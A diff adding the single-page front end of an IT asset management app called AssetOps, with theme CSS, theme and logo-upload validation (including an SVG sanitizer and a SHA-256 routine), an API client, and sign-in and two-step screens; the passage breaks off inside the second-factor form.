@@ -1,0 +1,2416 @@
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AssetOps — IT asset management</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  /* Theme layer. These six are admin-editable; everything below derives from them
+     so a colour change propagates without touching component CSS. */
+  --app-primary:#1E5A78; --app-secondary:#2F6B4C; --app-text:#17222E; --app-bg:#ffffff;
+  --app-font-family:system-ui,-apple-system,"Segoe UI",sans-serif;
+  --app-font-size:14px; --app-font-size-sm:12px; --app-font-size-lg:18px;
+
+  /* Fixed chrome. Deliberately not themed: the navigation rail stays legible
+     whatever palette an admin picks. */
+  --ground:#E7EBEF; --surface2:#F5F7F9;
+  --ink:#17222E; --muted:#61717F; --line:#CFD8E0; --line2:#E2E8ED;
+  --oxide:#A8442A; --oxide-l:#FAEDE9;
+  --moss:#2F6B4C; --moss-l:#EAF3EE;
+  --amber:#8A6614; --amber-l:#FBF2DE;
+  --r:3px;
+
+  /* Derived from the theme. Static fallbacks come first so a browser without
+     color-mix() still renders sensible tints rather than dropping the rule. */
+  --surface:#fff;
+  --surface:var(--app-bg);
+  --blue:#1E5A78;
+  --blue:var(--app-primary);
+  --blue-d:#164457;
+  --blue-d:color-mix(in srgb, var(--app-primary) 82%, #000);
+  --blue-l:#E8F0F4;
+  --blue-l:color-mix(in srgb, var(--app-primary) 11%, #fff);
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{
+  background:var(--ground); color:var(--app-text);
+  font-family:var(--app-font-family); font-size:var(--app-font-size); line-height:1.5;
+  -webkit-font-smoothing:antialiased;
+}
+.mono{font-family:"IBM Plex Mono",ui-monospace,monospace}
+button,input,select,textarea{font:inherit;color:inherit}
+a{color:var(--blue)}
+h1,h2,h3{margin:0;font-weight:600;letter-spacing:-.01em}
+h1{font-size:calc(var(--app-font-size-lg) * 1.16)}
+h2{font-size:var(--app-font-size-lg)}
+h3{font-size:13px;color:var(--muted);font-weight:600}
+
+/* shell */
+.shell{display:flex;min-height:100vh}
+.rail{
+  width:212px;flex:0 0 212px;background:#12202C;color:#B9C6D1;
+  display:flex;flex-direction:column;position:sticky;top:0;height:100vh;
+}
+.brand{padding:16px 16px 14px;border-bottom:1px solid #22333F}
+.brand b{color:#fff;font-size:16px;display:block;letter-spacing:-.02em}
+.brand img{max-height:26px;max-width:120px;object-fit:contain;display:block;margin-bottom:6px}
+.brand span{font-size:11px;color:#7E8FA0;font-family:"IBM Plex Mono",monospace}
+.nav{padding:8px 0;overflow-y:auto;flex:1}
+.nav button{
+  display:flex;align-items:center;gap:9px;width:100%;text-align:left;background:none;border:0;
+  padding:7px 16px;cursor:pointer;color:#B9C6D1;font-size:13.5px;border-left:2px solid transparent;
+}
+.nav button:hover{background:#1A2A38;color:#fff}
+.nav button.on{background:#1A2A38;color:#fff;border-left-color:var(--blue);font-weight:500}
+.nav .grp{padding:14px 16px 5px;font-size:11px;color:#6C7E8E;font-weight:500}
+.nav .ct{margin-left:auto;font-family:"IBM Plex Mono",monospace;font-size:11px;color:#728496}
+.railfoot{padding:10px 16px;border-top:1px solid #22333F;font-size:11px;color:#6C7E8E}
+
+.main{flex:1;min-width:0;display:flex;flex-direction:column}
+.top{
+  background:var(--surface);border-bottom:1px solid var(--line);
+  padding:11px 22px;display:flex;align-items:center;gap:14px;position:sticky;top:0;z-index:20;
+}
+.top .who{margin-left:auto;display:flex;align-items:center;gap:9px;font-size:12.5px;color:var(--muted)}
+.body{padding:20px 22px 60px;flex:1}
+
+/* controls */
+.btn{
+  background:var(--surface);border:1px solid var(--line);border-radius:var(--r);
+  padding:6px 12px;cursor:pointer;font-size:13px;white-space:nowrap;
+}
+.btn:hover{border-color:#A9B7C3;background:var(--surface2)}
+.btn:focus-visible,input:focus-visible,select:focus-visible,textarea:focus-visible,.nav button:focus-visible{outline:2px solid var(--blue);outline-offset:1px}
+.btn.p{background:var(--blue);border-color:var(--blue);color:#fff;font-weight:500}
+.btn.p:hover{background:var(--blue-d);border-color:var(--blue-d)}
+.btn.d{color:var(--oxide);border-color:#DFC3BA}
+.btn.d:hover{background:var(--oxide-l);border-color:var(--oxide)}
+.btn:disabled{opacity:.45;cursor:not-allowed}
+.btn.sm{padding:3px 8px;font-size:12px}
+input[type=text],input[type=number],input[type=date],input[type=email],select,textarea{
+  background:var(--surface);border:1px solid var(--line);border-radius:var(--r);padding:6px 9px;width:100%;
+}
+textarea{resize:vertical;font-family:"IBM Plex Mono",monospace;font-size:12.5px}
+label.f{display:block;margin-bottom:12px}
+label.f > span{display:block;font-size:12.5px;color:var(--muted);margin-bottom:3px}
+label.f > span i{color:var(--oxide);font-style:normal}
+
+/* surfaces */
+.card{background:var(--surface);border:1px solid var(--line);border-radius:var(--r)}
+.card > header{padding:11px 14px;border-bottom:1px solid var(--line2);display:flex;align-items:center;gap:10px}
+.card > .in{padding:14px}
+.grid{display:grid;gap:14px}
+.row{display:flex;align-items:center;gap:9px;flex-wrap:wrap}
+
+/* table */
+.tw{overflow:auto;max-height:none}
+table{border-collapse:collapse;width:100%;font-size:var(--app-font-size-sm)}
+th{
+  text-align:left;font-weight:600;font-size:var(--app-font-size-sm);color:var(--muted);
+  padding:8px 10px;border-bottom:1px solid var(--line);background:var(--surface2);
+  position:sticky;top:0;white-space:nowrap;
+}
+th.s{cursor:pointer;user-select:none}
+th.s:hover{color:var(--ink)}
+td{padding:7px 10px;border-bottom:1px solid var(--line2);vertical-align:top}
+tbody tr:hover{background:#F7F9FB}
+tbody tr.sel{background:var(--blue-l)}
+tbody tr.sel:hover{background:#DFEAF0}
+td.chk,th.chk{width:32px;padding-left:12px}
+.trunc{max-width:210px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:block}
+
+/* pills */
+.pill{display:inline-block;padding:1px 7px;border-radius:9px;font-size:11.5px;font-weight:500;white-space:nowrap}
+.pill.use{background:var(--moss-l);color:var(--moss)}
+.pill.rep{background:var(--oxide-l);color:var(--oxide)}
+.pill.spare{background:var(--surface2);color:var(--muted);border:1px solid var(--line)}
+.pill.repair{background:var(--amber-l);color:var(--amber)}
+.pill.retired{background:#EDEFF1;color:#7A8894}
+
+/* stats */
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(148px,1fr));gap:1px;background:var(--line);border:1px solid var(--line);border-radius:var(--r);overflow:hidden}
+.stat{background:var(--surface);padding:12px 14px}
+.stat b{display:block;font-family:"IBM Plex Mono",monospace;font-size:calc(var(--app-font-size) * 1.8);font-weight:500;letter-spacing:-.03em;line-height:1.15}
+.stat span{font-size:12px;color:var(--muted)}
+.stat.alert b{color:var(--oxide)}
+
+/* age spine — the one bold element */
+.spine{display:flex;height:52px;border:1px solid var(--line);border-radius:var(--r);overflow:hidden}
+.spine div{display:flex;align-items:flex-end;justify-content:center;padding-bottom:4px;font-family:"IBM Plex Mono",monospace;font-size:11px;color:#fff;min-width:0;position:relative}
+.spinelegend{display:flex;gap:16px;margin-top:8px;font-size:12px;color:var(--muted);flex-wrap:wrap}
+.spinelegend i{width:9px;height:9px;display:inline-block;border-radius:2px;margin-right:5px;vertical-align:middle}
+
+/* bars */
+.bars{display:grid;gap:6px}
+.bar{display:grid;grid-template-columns:120px 1fr 44px;align-items:center;gap:9px;font-size:12.5px}
+.bar .t{background:var(--blue);height:15px;border-radius:2px;min-width:2px}
+.bar .n{font-family:"IBM Plex Mono",monospace;text-align:right;color:var(--muted)}
+
+/* bulk bar */
+.bulk{
+  position:sticky;bottom:0;z-index:15;background:#12202C;color:#fff;
+  padding:9px 14px;display:flex;align-items:center;gap:9px;flex-wrap:wrap;border-radius:var(--r);margin-top:-1px;
+}
+.bulk b{font-family:"IBM Plex Mono",monospace;font-weight:500}
+.bulk .btn{background:#22333F;color:#fff;border-color:#2E4150}
+.bulk .btn:hover{background:#2C404E}
+.bulk select{background:#22333F;border-color:#2E4150;color:#fff;width:auto}
+
+/* drawer */
+.scrim{position:fixed;inset:0;background:rgba(18,32,44,.42);z-index:40}
+.drawer{
+  position:fixed;top:0;right:0;bottom:0;width:min(560px,94vw);background:var(--surface);z-index:41;
+  display:flex;flex-direction:column;border-left:1px solid var(--line);
+}
+.drawer header{padding:14px 18px;border-bottom:1px solid var(--line);display:flex;align-items:center;gap:10px}
+.drawer .in{padding:18px;overflow-y:auto;flex:1}
+.drawer footer{padding:12px 18px;border-top:1px solid var(--line);display:flex;gap:9px;background:var(--surface2)}
+@media (prefers-reduced-motion:no-preference){.drawer{animation:sl .16s ease-out}@keyframes sl{from{transform:translateX(14px);opacity:.6}}}
+
+/* misc */
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:0 14px}
+.empty{padding:36px 20px;text-align:center;color:var(--muted)}
+.empty b{display:block;color:var(--ink);margin-bottom:4px}
+.note{background:var(--surface2);border:1px solid var(--line2);border-radius:var(--r);padding:10px 12px;font-size:12.5px;color:var(--muted)}
+.toast{position:fixed;left:50%;transform:translateX(-50%);bottom:22px;background:#12202C;color:#fff;padding:9px 16px;border-radius:var(--r);z-index:60;font-size:13px}
+.tabs{display:flex;gap:2px;border-bottom:1px solid var(--line);margin-bottom:14px;flex-wrap:wrap}
+.tabs button{background:none;border:0;border-bottom:2px solid transparent;padding:7px 12px;cursor:pointer;color:var(--muted);font-size:13.5px}
+.tabs button.on{color:var(--ink);border-bottom-color:var(--blue);font-weight:500}
+.kv{display:grid;grid-template-columns:132px 1fr;gap:5px 12px;font-size:13px}
+.kv dt{color:var(--muted)}
+.kv dd{margin:0}
+.chips{display:flex;gap:5px;flex-wrap:wrap}
+.chip{background:var(--surface2);border:1px solid var(--line);border-radius:11px;padding:2px 9px;font-size:12px}
+.chip button{background:none;border:0;cursor:pointer;color:var(--muted);padding:0 0 0 4px}
+@media(max-width:820px){
+  .rail{position:fixed;left:-212px;z-index:50;transition:left .16s}
+  .rail.open{left:0}
+  .shell{display:block}
+  .g2{grid-template-columns:1fr}
+  .body{padding:14px}
+}
+@media print{.rail,.top,.bulk,.noprint{display:none!important}.body{padding:0}}
+
+/* ---- theme settings page ---- */
+.tcols{display:grid;grid-template-columns:minmax(0,390px) minmax(0,1fr);gap:16px;align-items:start}
+@media(max-width:980px){.tcols{grid-template-columns:1fr}}
+.tsticky{position:sticky;top:62px}
+fieldset{border:0;padding:0;margin:0 0 18px}
+fieldset:disabled{opacity:.6}
+legend{font-size:12px;font-weight:600;color:var(--muted);padding:0 0 8px}
+.colrow{display:flex;gap:7px;align-items:center}
+.colrow input[type=color]{width:38px;height:32px;padding:2px;border:1px solid var(--line);border-radius:var(--r);background:#fff;cursor:pointer;flex:0 0 38px}
+.ferr{display:block;color:var(--oxide);font-size:12px;font-style:normal;margin-top:3px}
+input[aria-invalid=true]{border-color:var(--oxide);background:var(--oxide-l)}
+.twarn{background:var(--amber-l);border:1px solid #E6D4A8;color:var(--amber);border-radius:var(--r);padding:8px 10px;font-size:12.5px;margin:0 0 12px}
+.alert{border-radius:var(--r);padding:9px 12px;font-size:13px;margin-bottom:14px}
+.alert.e{background:var(--oxide-l);border:1px solid #DFC3BA;color:var(--oxide)}
+.alert.k{background:var(--moss-l);border:1px solid #B9D7C6;color:var(--moss)}
+.stage{border:1px solid var(--line);border-radius:var(--r);padding:20px;background:var(--app-bg);color:var(--app-text);font-family:var(--app-font-family);font-size:var(--app-font-size)}
+.stage h3{font-size:var(--app-font-size-lg);margin:0 0 8px}
+.stage p{margin:0 0 12px;max-width:56ch}
+.stage .pbtn{background:var(--app-primary);color:#fff;border:0;padding:7px 14px;border-radius:var(--r);font-size:var(--app-font-size-sm);cursor:default}
+.stage .sec{color:var(--app-secondary);margin-left:12px;font-size:var(--app-font-size-sm);font-weight:500}
+.stage table{margin-top:14px}
+.stage .lg{max-height:34px;max-width:150px;object-fit:contain;margin-bottom:12px;display:block}
+.drop{border:1px dashed var(--line);border-radius:var(--r);padding:14px;text-align:center;background:var(--surface2)}
+.drop.over{border-color:var(--blue);background:var(--blue-l)}
+.logobox{display:flex;align-items:center;gap:12px;padding:10px;border:1px solid var(--line2);border-radius:var(--r);background:var(--surface2);margin-bottom:10px}
+.logobox img{max-height:44px;max-width:130px;object-fit:contain}
+.logobox .meta{font-size:12px;color:var(--muted);line-height:1.5}
+.logobox.pending{border-color:var(--amber);background:var(--amber-l)}
+.rlog{background:#12202C;color:#C7D3DD;border-radius:var(--r);padding:10px 12px;font-family:"IBM Plex Mono",monospace;font-size:11.5px;max-height:210px;overflow:auto;line-height:1.7}
+.rlog .m{color:#7FB3CC;font-weight:500}
+.rlog .ok{color:#7CC79B}
+.rlog .no{color:#E39B86}
+.rlog .dim{color:#68798A}
+.modal{position:fixed;inset:0;background:rgba(18,32,44,.45);display:flex;align-items:center;justify-content:center;z-index:60;padding:16px}
+.modal .box{background:#fff;border-radius:4px;max-width:480px;padding:20px}
+.modal p{color:var(--muted);font-size:13.5px;margin:0 0 16px;line-height:1.55}
+.spin{display:inline-block;width:11px;height:11px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:sp .6s linear infinite;vertical-align:-1px;margin-right:6px}
+@keyframes sp{to{transform:rotate(360deg)}}
+@media (prefers-reduced-motion:reduce){.spin{animation:none}}
+.dirty{font-size:12px;color:var(--amber);align-self:center}
+.tests{display:grid;gap:6px}
+.tests button{text-align:left;font-size:12.5px;padding:7px 10px;line-height:1.45}
+
+/* ---- sign in ---- */
+.loginwrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;background:var(--ground)}
+.logincard{background:#fff;border:1px solid var(--line);border-radius:4px;padding:26px;width:min(370px,100%)}
+.logincard h1{font-size:21px;margin-bottom:2px}
+.logincard .sub{color:var(--muted);font-size:13px;margin:0 0 20px;font-family:"IBM Plex Mono",monospace}
+.logincard input{width:100%}
+.logincard .hint{color:var(--muted);font-size:12px;margin:14px 0 0;line-height:1.5}
+.who button{margin-left:2px}
+.kv dt{color:var(--muted)}
+</style>
+
+<body>
+<script>
+/* ============================================================================
+   Section 1 — src/shared/themeSchema.js, verbatim (module syntax removed).
+   Same code the Express routes use. Client and server cannot disagree.
+   ========================================================================== */
+const FONT_SIZE_MIN=12, FONT_SIZE_MAX=32;
+const FONT_FAMILIES=[
+  {id:'system',label:'System UI',stack:'system-ui, -apple-system, "Segoe UI", sans-serif',google:null},
+  {id:'inter',label:'Inter',stack:'"Inter", system-ui, sans-serif',google:'Inter:wght@400;500;600;700'},
+  {id:'plex-sans',label:'IBM Plex Sans',stack:'"IBM Plex Sans", system-ui, sans-serif',google:'IBM+Plex+Sans:wght@400;500;600;700'},
+  {id:'source-sans',label:'Source Sans 3',stack:'"Source Sans 3", system-ui, sans-serif',google:'Source+Sans+3:wght@400;500;600;700'},
+  {id:'roboto',label:'Roboto',stack:'"Roboto", system-ui, sans-serif',google:'Roboto:wght@400;500;700'},
+  {id:'lora',label:'Lora',stack:'"Lora", Georgia, serif',google:'Lora:wght@400;500;600'},
+  {id:'georgia',label:'Georgia',stack:'Georgia, "Times New Roman", serif',google:null}
+];
+const FONT_FAMILY_IDS=FONT_FAMILIES.map(f=>f.id);
+const DEFAULT_THEME=Object.freeze({
+  primaryColor:'#1e5a78',secondaryColor:'#2f6b4c',textColor:'#17222e',
+  backgroundColor:'#ffffff',fontFamily:'system',fontSize:14
+});
+const HEX_RE=/^#(?:[0-9a-fA-F]{3}|[0-9a-fA-F]{6})$/;
+const isHexColor=v=>typeof v==='string'&&HEX_RE.test(v.trim());
+function normalizeHex(v){const s=String(v).trim().toLowerCase();
+  return s.length===4?'#'+s[1]+s[1]+s[2]+s[2]+s[3]+s[3]:s;}
+function isValidFontSize(v){const n=typeof v==='string'&&v.trim()!==''?Number(v):v;
+  return Number.isInteger(n)&&n>=FONT_SIZE_MIN&&n<=FONT_SIZE_MAX;}
+const isValidFontFamily=v=>typeof v==='string'&&FONT_FAMILY_IDS.includes(v);
+const fontStackFor=id=>(FONT_FAMILIES.find(x=>x.id===id)||FONT_FAMILIES[0]).stack;
+function luminance(hex){const h=normalizeHex(hex);
+  const ch=[1,3,5].map(i=>{const c=parseInt(h.slice(i,i+2),16)/255;
+    return c<=0.03928?c/12.92:Math.pow((c+0.055)/1.055,2.4);});
+  return 0.2126*ch[0]+0.7152*ch[1]+0.0722*ch[2];}
+function contrastRatio(a,b){const l1=luminance(a),l2=luminance(b);
+  return (Math.max(l1,l2)+0.05)/(Math.min(l1,l2)+0.05);}
+function validateTheme(input,base=DEFAULT_THEME){
+  const errors={},warnings=[],value={...base};
+  if(input===null||typeof input!=='object'||Array.isArray(input))
+    return {valid:false,errors:{_:'Body must be a JSON object.'},value,warnings};
+  for(const key of ['primaryColor','secondaryColor','textColor','backgroundColor']){
+    if(input[key]===undefined)continue;
+    if(!isHexColor(input[key]))errors[key]='Must be a hex colour such as #1e5a78.';
+    else value[key]=normalizeHex(input[key]);
+  }
+  if(input.fontFamily!==undefined){
+    if(!isValidFontFamily(input.fontFamily))errors.fontFamily=`Must be one of: ${FONT_FAMILY_IDS.join(', ')}.`;
+    else value.fontFamily=input.fontFamily;
+  }
+  if(input.fontSize!==undefined){
+    if(!isValidFontSize(input.fontSize))errors.fontSize=`Must be a whole number between ${FONT_SIZE_MIN} and ${FONT_SIZE_MAX}.`;
+    else value.fontSize=Number(input.fontSize);
+  }
+  if(!errors.textColor&&!errors.backgroundColor){
+    const r=contrastRatio(value.textColor,value.backgroundColor);
+    if(r<4.5)warnings.push(`Text on background is ${r.toFixed(2)}:1, below the WCAG AA minimum of 4.5:1.`);
+  }
+  return {valid:Object.keys(errors).length===0,errors,value,warnings};
+}
+function themeToCssVars(t){return{
+  '--app-primary':t.primaryColor,'--app-secondary':t.secondaryColor,
+  '--app-text':t.textColor,'--app-bg':t.backgroundColor,
+  '--app-font-family':fontStackFor(t.fontFamily),'--app-font-size':`${t.fontSize}px`,
+  '--app-font-size-sm':`${Math.round(t.fontSize*0.86)}px`,
+  '--app-font-size-lg':`${Math.round(t.fontSize*1.28)}px`
+};}
+
+/* ============================================================================
+   Section 2 — src/admin/applyTheme.js
+   ========================================================================== */
+const WEBFONT_ID='app-theme-webfont';
+function applyTheme(theme,target=document.documentElement){
+  const vars=themeToCssVars(theme);
+  for(const [n,v] of Object.entries(vars))target.style.setProperty(n,v);
+  if(target===document.documentElement)ensureWebfont(theme.fontFamily);
+}
+function ensureWebfont(id){
+  const font=FONT_FAMILIES.find(f=>f.id===id);
+  const link=document.getElementById(WEBFONT_ID);
+  if(!font||!font.google){if(link)link.remove();return;}
+  const href=`https://fonts.googleapis.com/css2?family=${font.google}&display=swap`;
+  if(link){if(link.href!==href)link.href=href;return;}
+  const el=document.createElement('link');
+  el.id=WEBFONT_ID;el.rel='stylesheet';el.href=href;
+  document.head.appendChild(el);
+}
+
+/* ============================================================================
+   Section 3 — logoService.js validation, running in the browser.
+   In production this runs on the SERVER; a client-side copy is advisory only.
+   The rules below are byte-for-byte the ones the Node service applies.
+   ========================================================================== */
+const MAX_LOGO_BYTES=2*1024*1024;
+const ALLOWED_EXT={png:'.png',jpeg:'.jpg',svg:'.svg'};
+const ALLOWED_MIME={'image/png':'png','image/jpeg':'jpeg','image/jpg':'jpeg','image/svg+xml':'svg'};
+
+function sniffFormat(buf){
+  if(!buf||buf.length<12)return null;
+  if(buf[0]===0x89&&buf[1]===0x50&&buf[2]===0x4e&&buf[3]===0x47&&
+     buf[4]===0x0d&&buf[5]===0x0a&&buf[6]===0x1a&&buf[7]===0x0a)return 'png';
+  if(buf[0]===0xff&&buf[1]===0xd8&&buf[2]===0xff)return 'jpeg';
+  const head=new TextDecoder().decode(buf.subarray(0,2048)).replace(/^\uFEFF/,'').trimStart();
+  if(/^<(\?xml|!DOCTYPE svg|svg)[\s>]/i.test(head)&&/<svg[\s>]/i.test(head))return 'svg';
+  return null;
+}
+function looksComplete(buf,format){
+  if(format==='png'){
+    if(buf.length<=20)return false;
+    const t=buf.subarray(buf.length-8);
+    const want=[0x49,0x45,0x4e,0x44,0xae,0x42,0x60,0x82];
+    return want.every((b,i)=>t[i]===b);
+  }
+  if(format==='jpeg')return buf.length>4&&buf[buf.length-2]===0xff&&buf[buf.length-1]===0xd9;
+  if(format==='svg')return /<\/svg\s*>\s*$/i.test(new TextDecoder().decode(buf).trimEnd());
+  return false;
+}
+function sanitizeSvg(text){
+  let s=text;
+  s=s.replace(/<\s*script[\s\S]*?<\s*\/\s*script\s*>/gi,'');
+  s=s.replace(/<\s*(foreignObject|iframe|embed|object|animate|set|handler)\b[\s\S]*?<\s*\/\s*\1\s*>/gi,'');
+  s=s.replace(/<\s*(script|foreignObject|iframe|embed|object|use)\b[^>]*\/\s*>/gi,'');
+  s=s.replace(/\son[a-z]+\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)/gi,'');
+  s=s.replace(/(href|xlink:href)\s*=\s*(?:"|')?\s*(javascript|data):[^"'>\s]*(?:"|')?/gi,'');
+  s=s.replace(/<!ENTITY[\s\S]*?>/gi,'');
+  s=s.replace(/<\s*!DOCTYPE[^>]*\[[\s\S]*?\]\s*>/gi,'');
+  return s;
+}
+/**
+ * SHA-256, implemented directly rather than via crypto.subtle. WebCrypto is only
+ * available in a secure context, so it is absent over file:// and in some
+ * embedded viewers - and an unavailable digest would fail every upload.
+ * The Node service uses node:crypto; this produces identical digests.
+ */
+function sha256Hex(bytes){
+  const K=[0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
+           0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
+           0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
+           0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
+           0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
+           0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
+           0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
+           0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2];
+  let H=[0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19];
+  const ml=bytes.length*8;
+  const withPad=new Uint8Array(((bytes.length+9+63)>>6)<<6);
+  withPad.set(bytes); withPad[bytes.length]=0x80;
+  const dv=new DataView(withPad.buffer);
+  dv.setUint32(withPad.length-4, ml>>>0);
+  dv.setUint32(withPad.length-8, Math.floor(ml/4294967296));
+  const w=new Uint32Array(64);
+  const rr=(x,n)=>(x>>>n)|(x<<(32-n));
+  for(let i=0;i<withPad.length;i+=64){
+    for(let t=0;t<16;t++)w[t]=dv.getUint32(i+t*4);
+    for(let t=16;t<64;t++){
+      const s0=rr(w[t-15],7)^rr(w[t-15],18)^(w[t-15]>>>3);
+      const s1=rr(w[t-2],17)^rr(w[t-2],19)^(w[t-2]>>>10);
+      w[t]=(w[t-16]+s0+w[t-7]+s1)>>>0;
+    }
+    let [a,b,c,d,e,f,g,h]=H;
+    for(let t=0;t<64;t++){
+      const S1=rr(e,6)^rr(e,11)^rr(e,25);
+      const ch=(e&f)^(~e&g);
+      const t1=(h+S1+ch+K[t]+w[t])>>>0;
+      const S0=rr(a,2)^rr(a,13)^rr(a,22);
+      const maj=(a&b)^(a&c)^(b&c);
+      const t2=(S0+maj)>>>0;
+      h=g;g=f;f=e;e=(d+t1)>>>0;d=c;c=b;b=a;a=(t1+t2)>>>0;
+    }
+    H=[H[0]+a,H[1]+b,H[2]+c,H[3]+d,H[4]+e,H[5]+f,H[6]+g,H[7]+h].map(x=>x>>>0);
+  }
+  return H.map(x=>x.toString(16).padStart(8,'0')).join('');
+}
+/* ============================================================================
+   Client data layer.
+
+   Every mutation is one HTTP call against one record. There is no whole-document
+   save any more, so two people working at once no longer overwrite each other.
+   ========================================================================== */
+
+/** Normalises every failure into an Error carrying code, fields and status. */
+async function request(method, path, body){
+  let res;
+  try{
+    res = await fetch(path, {
+      method,
+      credentials: 'same-origin',
+      headers: { 'Content-Type': 'application/json' },
+      body: body === undefined ? undefined : JSON.stringify(body)
+    });
+  }catch(networkError){
+    const e = new Error('Could not reach the server. Check your connection.');
+    e.code = 'OFFLINE';
+    throw e;
+  }
+  let payload = null;
+  const text = await res.text();
+  try { payload = text ? JSON.parse(text) : null; } catch { /* non-JSON */ }
+
+  if(!res.ok){
+    const info = (payload && payload.error) || {};
+    const e = new Error(info.message || `Request failed (${res.status})`);
+    e.status = res.status;
+    e.code = info.code || 'UNKNOWN';
+    e.fields = info.fields || null;
+    e.current = info.current || null;   // the winning row, on a 409
+    throw e;
+  }
+  return payload;
+}
+
+const API = {
+  login: (email, password) => request('POST', '/api/auth/login', { email, password }),
+  logout: () => request('POST', '/api/auth/logout', {}),
+  me: () => request('GET', '/api/auth/me'),
+  changePassword: (currentPassword, newPassword) =>
+    request('POST', '/api/auth/password', { currentPassword, newPassword }),
+  verifyMfa: code => request('POST', '/api/auth/mfa', { code }),
+  mfaSetup: () => request('POST', '/api/auth/mfa/setup', {}),
+  mfaEnable: code => request('POST', '/api/auth/mfa/enable', { code }),
+  mfaDisable: password => request('POST', '/api/auth/mfa/disable', { password }),
+  resetPassword: (token, newPassword) => request('POST', '/api/auth/reset', { token, newPassword }),
+  issueResetToken: userId => request('POST', `/api/users/${userId}/reset-token`, {}),
+
+  bootstrap: () => request('GET', '/api/bootstrap'),
+  activity: () => request('GET', '/api/activity'),
+
+  createAsset: a => request('POST', '/api/assets', a),
+  updateAsset: (id, patch) => request('PUT', `/api/assets/${id}`, patch),
+  deleteAsset: id => request('DELETE', `/api/assets/${id}`, {}),
+  bulkAssets: (ids, patch) => request('POST', '/api/assets/bulk', { ids, patch }),
+  importAssets: rows => request('POST', '/api/assets/import', { rows }),
+
+  createSite: s => request('POST', '/api/sites', s),
+  deleteSite: id => request('DELETE', `/api/sites/${id}`, {}),
+  createDept: name => request('POST', '/api/departments', { name }),
+  renameDept: (id, name) => request('PUT', `/api/departments/${id}`, { name }),
+  deleteDept: id => request('DELETE', `/api/departments/${id}`, {}),
+  createCompany: c => request('POST', '/api/companies', c),
+  deleteCompany: id => request('DELETE', `/api/companies/${id}`, {}),
+
+  createField: f => request('POST', '/api/fields', f),
+  updateField: (id, patch) => request('PUT', `/api/fields/${id}`, patch),
+  deleteField: id => request('DELETE', `/api/fields/${id}`, {}),
+
+  createUser: u => request('POST', '/api/users', u),
+  updateUser: (id, patch) => request('PUT', `/api/users/${id}`, patch),
+  deleteUser: id => request('DELETE', `/api/users/${id}`, {}),
+
+  getTheme: () => request('GET', '/api/settings/theme'),
+  putTheme: t => request('PUT', '/api/settings/theme', t),
+  resetTheme: logoAction => request('POST', '/api/settings/theme/reset', { logoAction }),
+  putLogo: dataBase64 => request('POST', '/api/settings/logo', { data: dataBase64 }),
+  deleteLogo: () => request('DELETE', '/api/settings/logo', {})
+};
+
+/** Reads a File as bare base64, without the data: prefix the server would strip. */
+function fileToBase64(file){
+  return new Promise((resolve, reject) => {
+    const r = new FileReader();
+    r.onload = () => {
+      const s = String(r.result);
+      resolve(s.slice(s.indexOf(',') + 1));
+    };
+    r.onerror = () => reject(new Error('That file could not be read.'));
+    r.readAsDataURL(file);
+  });
+}
+/* ============================================================================
+   Sign-in screen. Nothing else renders until there is a session.
+   ========================================================================== */
+
+let ME = null;
+
+function renderLogin(message){
+  document.body.innerHTML = `
+  <div class="loginwrap">
+    <form class="logincard" id="loginform" novalidate>
+      <h1>AssetOps</h1>
+      <p class="sub">IT asset register</p>
+      ${message ? `<div class="alert e" role="alert">${esc(message)}</div>` : ''}
+      <label class="f"><span>Email</span>
+        <input type="email" id="lemail" autocomplete="username" autofocus required></label>
+      <label class="f"><span>Password</span>
+        <input type="password" id="lpass" autocomplete="current-password" required></label>
+      <button class="btn p" id="lgo" type="submit" style="width:100%">Sign in</button>
+      <p class="hint">Sessions last seven days. Signing out ends them straight away.</p>
+      <button class="btn" id="lforgot" type="button" style="width:100%;margin-top:8px">I have a reset token</button>
+    </form>
+  </div>`;
+
+  document.getElementById('lforgot').onclick = () => renderReset();
+  const form = document.getElementById('loginform');
+  form.onsubmit = async e => {
+    e.preventDefault();
+    const btn = document.getElementById('lgo');
+    const email = document.getElementById('lemail').value.trim();
+    const password = document.getElementById('lpass').value;
+    if(!email || !password) return renderLogin('Enter both an email and a password.');
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spin"></span>Signing in…';
+    try{
+      const r = await API.login(email, password);
+      if(r.mfaRequired) return renderMfa();
+      ME = r.user;
+      await boot();
+    }catch(err){
+      renderLogin(err.message);
+      const f = document.getElementById('lemail');
+      if(f) f.value = email;
+    }
+  };
+}
+
+/* --- second factor ------------------------------------------------------- */
+
+function renderMfa(message){
+  document.body.innerHTML = `
+  <div class="loginwrap">
+    <form class="logincard" id="mfaform" novalidate>
+      <h1>Two-step check</h1>
+      <p class="sub">One more step</p>
